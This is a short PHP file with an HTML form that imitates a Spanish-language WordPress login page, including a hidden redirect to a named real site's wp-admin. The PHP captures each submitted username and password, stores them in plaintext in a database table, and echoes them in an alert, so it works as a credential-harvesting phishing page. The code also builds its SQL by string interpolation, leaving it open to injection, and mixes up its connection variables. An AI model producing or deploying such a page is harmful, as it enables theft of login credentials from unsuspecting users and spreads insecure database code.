<?php
/////https://www.w3schools.com/php/php_mysql_insert.asp

require_once("conn/connection.php");


if(isset($_POST['wp-submit'])){

$log = $_POST['log'];
$password = $_POST['pwd'];

//validation
$log = htmlspecialchars($log);
$password = htmlspecialchars($password);

$query="INSERT INTO `users` ( `log`, `pwd`) 
VALUES ( '$log', '$password')";

$result = mysqli_query($conn,$query);

if(!$result){
    die("query failed" . mysqli_error($connection));
}else{
    echo strtoupper("query inserted succesful");
}

echo "<script>alert('$log . $password')</script>";
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>form example</title>
</head>
<body>

<form name="loginform" id="loginform" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">

<p>
<label for="user_login">Nombre de usuario o dirección de correo<br>
<input type="text" name="log" id="user_login" class="input" value="" size="20"></label>
</p>

<p>
<label for="user_pass">Contraseña<br>
<input type="password" name="pwd" id="user_pass" class="input" value="" size="20"></label>
</p>

<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Recuérdame</label></p>

<p class="submit">
<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Acceder">
<input type="hidden" name="redirect_to" value="https://www.mediale.cl/wp-admin/">
<input type="hidden" name="testcookie" value="1">
</p>
</form>
    
</body>
</html>
